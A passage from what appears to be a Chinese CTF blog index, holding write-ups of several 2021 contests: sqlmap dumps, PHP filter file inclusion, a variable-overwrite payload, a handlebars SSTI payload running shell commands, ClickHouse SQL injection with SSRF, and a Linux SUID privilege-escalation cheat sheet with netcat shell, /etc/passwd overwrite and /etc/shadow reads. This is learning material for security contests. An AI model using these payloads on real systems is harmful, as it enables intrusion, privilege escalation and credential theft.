(ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');","link":"/2021/10/14/crypto/"},{"title":"misc网站","text":"brainfuck加密:https://www.splitbrain.org/services/ookbase64解码后可以直接转文件:https://the-x.cn/base64bugku解密网站:https://ctf.bugku.com/tools.html","link":"/2021/10/14/misc%E7%BD%91%E7%AB%99/"},{"title":"2021校赛","text":"web-1题目地址: 172.31.65.173:80 翻了一下robots.txt，抓了一下包，都没有什么有用信息，那就是需要扫描目录了，使用dirsearch扫描工具进行扫描 python dirsearch.py -u &quot;http://172.31.65.173/&quot; 发现有一个js目录点进去以后即可看到源码看到可疑源码，这是aaencode编码，搜索一下解码网站进行解码即可 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\&quot;';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_') 使用https://www.qtool.net/decode这个网址就可以解码了 web-2题目地址 172.31.65.174:80 一开始一个搜索框，考点就那几个sql，ssti，命令执行…，先试试单引号，发现报错了 发现报错了所以是sql报错注入，可以直接使用sqlmap去跑就好了 sqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; --dbssqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tablessqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_newssqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_news --columnsqlmap -u &quot;http://172.31.65.174/search.jsp?keyname=&quot; -D attackdb --tables -T db_news --columns -C flag --dump web-3题目地址 172.31.65.175 搜寻信息，查看一下页面源码，发现有一个index.php点进去以后继续查看源码，发现有个参数?page=index，查看的是文件，所以试试是不是任意文件读取（文件包含） 发现可以读到/etc/passwd 非预期解：大多数情况下，文件读取的题目，flag都会在根目录下，所以直接读取就好了 ?page=/flag 预期解：预期解的话，肯定是要先读一下源码，所以需要配合php伪协议进行源码的读取 试了几个，发现使用rot13编码就可以了，但是现在代码也读不了，需要使用rot13解码(不过这题直接给了rot13这个编码，…..) http://192.168.87.183/index.php?page=php://filter/read=string.rot13/resource=index.php 然后来审一下源码 &lt;?php$page = $_get['page'];if (isset($page)) {if (preg_match(&quot;/^.+base.+$/&quot;,$page)) {#说明过滤了base?&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die(&quot;&lt;/br&gt;not base&quot;);?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }else{ ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=&quot;text-align:center&quot;&gt; &lt;p class=&quot;lead&quot;&gt; &lt;?php if ($page === 'index.php') { die('ok'); } include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }} $hashed_key = 'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'; $parsed = parse_url($_server['request_uri']); $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query);#存在变量覆盖 if($parsed_query!=null){ $action = $parsed_query['action']; } if($action===&quot;auth&quot;){ $key = $_get[&quot;key&quot;]; $hashed_input = hash('sha384', $key);#使用sha384加密key //echo $hashed_input.'\\n'; if($hashed_input!==$hashed_key){#sha384加密以后的key要等于本来的hashed_key die(&quot;no way to get flag!&quot;); } echo file_get_contents(&quot;/flag&quot;); } ?&gt;&lt;/body&gt; 思路：通过变量覆盖，将hash_key变量覆盖为我们可控的key parse_url()将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量 写个简单的脚本debug一下让大家看看原理吧 本地复现源码如下: &lt;?php$hashed_key = 'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b';$parsed = parse_url($_SERVER['REQUEST_URI']);$query = $parsed[&quot;query&quot;];$parsed_query = parse_str($query);print($hashed_key); 首先我传入这个值 然后我们到phpstorm里面去跟进一下:可以看到我们传入的hashed_key=123是数组中query键的值 经过parse_str函数的转化后hashed_key从一开始的那一大串东西被重新赋值为123了，产生了变量覆盖漏洞 所以，根据这个漏洞，我们可以随便传入一个1经过sha加密以后对hash_进行变量覆盖，然后这个是payload ?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776 即可拿到flag","link":"/2021/10/18/2021%E6%A0%A1%E8%B5%9B/"},{"title":"2021东华杯","text":"前言比赛那天体侧==人傻了，后面也没心情做，但是感觉比赛的题都是可以学习的，可惜没想到环境马上就关了– apacheprOxy附近是一个docker文件，发现是GKCTF2021的原题（简化版）,这里主要学习一下学长的工具试试看 首先使用扫描器扫描链接 python3 ws.py -t xx.xx.xx.xx 然后使用工具一键getshell python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami eznode看看能不能本地起一个跑一下看看配置过程，首先出现了第一个问题: 'const' is available in ES6 (use 'esversion: 6') or Mozilla JS extensions (use moz). (W104) 查到解决方法是:在开头添加一个 /*jshint esversion: 6 */ 然后一直说找不到module，install了很多次，发现需要cd到那个项目目录下去install这些模块 npm install 由于前面的登录部分需要麻烦的数据库之类的配置，所以我就直接进入到upload的路由，并删除校验的部分了查看package.json，一个一个查漏洞（积累下） { &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;scripts&quot;: { &quot;start&quot;: &quot;node ./bin/www&quot;, &quot;dev&quot;: &quot;nodemon index.js -e js&quot; }, &quot;dependencies&quot;: { &quot;cookie-parser&quot;: &quot;~1.4.4&quot;, &quot;crypto&quot;: &quot;^1.0.1&quot;, &quot;debug&quot;: &quot;~2.6.9&quot;, &quot;express&quot;: &quot;~4.16.1&quot;, &quot;hbs&quot;: &quot;^4.0.1&quot;, &quot;http-errors&quot;: &quot;~1.6.3&quot;, &quot;morgan&quot;: &quot;~1.9.1&quot;, &quot;multer&quot;: &quot;^1.4.3&quot;, &quot;mysql&quot;: &quot;^2.18.1&quot;, &quot;path&quot;: &quot;^0.12.7&quot;, &quot;sequelize&quot;: &quot;^6.7.0&quot; }} 发现hbs的模板渲染有一个CVE-2021-32822参考文章:https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return require('child_process').exec('whoami');&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return process.mainModule.require('child_process').execSync('cat /flag').toString();&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} OldLibrary这里就记录一下 Linux SUID 提权关于suidsuid是赋予文件的一种权限具体叙述可以参考:https://www.cnblogs.com/sparkdev/p/9651622.html总结来说就是:当一个二进制可执行文件具有suid权限时，尽管不是root用户也可以执行本该root用户才能执行的功能 查找suid权限位文件下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ;find /bin -perm -u=s -type f 2&gt;/dev/nullfind /usr -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null 也可以使用 sudo -l 命令列出当前用户可执行的命令 常用提权方式nmap（2.02-5.21）存在交换模式，可利用提权 nmap --interactive 之后执行: nmap&gt; !shsh-3.2# whoamiroot msf中的模块为： exploit/unix/local/setuid_nmap 较新版可使用 --script 参数： echo &quot;os.execute('/bin/sh')&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse findtouch testfind test -exec whoami \\; nc 反弹 shell： find test -exec netcat -lvp 5555 -e /bin/sh \\; 2.3 vi/vim打开vim,按下ESC :set shell=/bin/sh:shell 或者 sudo vim -c '!sh' 2.4 bashbash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 2.5 lessless /etc/passwd!/bin/sh 2.6 moremore /home/pelle/myfile!/bin/bash 2.7 cp覆盖 /etc/shadow 或 /etc/passwd [zabbix@localhost ~]$ cat /etc/passwd &gt;passwd2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack1233.$1$hack$WTn0dk2QjNeKfl.DHOUue04.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd5.[zabbix@localhost ~]$ cp passwd /etc/passwd6.[zabbix@localhost ~]$ su - hack7.Password:8.[root@361way ~]# id9.uid=0(hack) gid=0(root) groups=0(root)10.[root@361way ~]# cat /etc/passwd|tail -111.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 2.8 mv覆盖 /etc/shadow 或 /etc/passwd 2.9 nanonano /etc/passwd 2.10 awkawk 'BEGIN {system(&quot;/bin/sh&quot;)}' 2.11 manman passwd!/bin/bash 2.12 wgetwget http://192.168.56.1:8080/passwd -O /etc/passwd 2.13 apache仅可查看文件，不能弹 shell： apache2 -f /etc/shadow 2.14 tcpdumpecho $'id\\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 2.15 python/perl/ruby/lua/php/etcpython python -c &quot;import os;os.system('/bin/bash')&quot; perl exec &quot;/bin/bash&quot;; 就测试了一下vi的，发现还挺神奇的 原作者用得是 find / -perm -u=s -type f 2&gt;/dev/null #查找系统上运行的所有SUID可执行文件comm /flagggisshere /dev/null 2&gt; /dev/null 参考：http://www.snowywar.top/?p=2743","link":"/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF/"},{"title":"2021bytectf复现","text":"前言本来想打的（虽然自己很菜），但是周末有校赛，被拉过去凑数了没办法，后面来复现学习一下 double sqli输入单引号有报错信息,搜索了一下报错信息，发现是clickhouse下的sql 这里查到了clickhouse下sql使用的手册，直接使用union就可以实现联合注入，并且是数字型注入 1 union all select user() 但是啥也没有抓包一下，发现是nginx服务器 ?id=2时 然后看到有个file，又是nginx服务器，有个目录穿越的漏洞：https://blog.csdn.net/weixin_41924764/article/details/113362883 /flies../ 接下来就是去看看有没有sql配置文件看看里面的信息 http://39.105.175.150:30001/files../var/lib/clickhouse/access/ 下载userlist和另外两个sql配置文件可以发现，存在另一个user用户 发现存在着另一个用户的密码 ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';ATTACH GRANT SELECT ON ctf.* TO user_01; 然后要怎么登陆呢？使用另一个用户登陆mysql，那就需要ssrf查了一下 发现clickhouse中的sql可以使用url()来执行http协议，并且clickhouse中的http协议可以实现sql语句的使用实现ssrf https://clickhouse.com/docs/zh/sql-reference/table-functions/url/ https://clickhouse.com/docs/zh/interfaces/http/ https://blog.deteact.com/yandex-clickhouse-injection/ 这个是个例子，根据这个例子我们可以构造一下试试看 ?id=1 union all select * from url('http://127.0.0.1:8123/?query=select+*+from+ctf.flag&amp;user=user_01&amp;password=e3b0c44298fc1c149afb',Values, 'column1 String') 这样就可以了，主要是读文档的能力吧 Unsecure Blog该blog是基于Jfinal框架进行二次开发的，在应用启动除发现存在全局的securitymanager，并且做了一些限制","link":"/2021/10/19/2021bytectf%E5%A4%8D%E7%8E%B0/"},{"title":"2021hack.lu","text":"Diamond Safe下载源码: 虽然存在过滤函数 但是问题不大，因为存在格式化字符串漏洞 我们的最终目的应该是构造出万能密码，然后成功登陆即可阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号查询语句为: SELECT * FROM `users` where password=sha1(%s) and name='%s' 如果我们此时仅输入单引号，那么就会被过滤函数给转义 从'变成\\' 因为存在格式化字符串漏洞，我们可以利用这里%会吃字符的特性，吃掉\\ $a=&quot;name='%\\&quot;;$b=vsprintf($a,'a');echo $b;#name='' 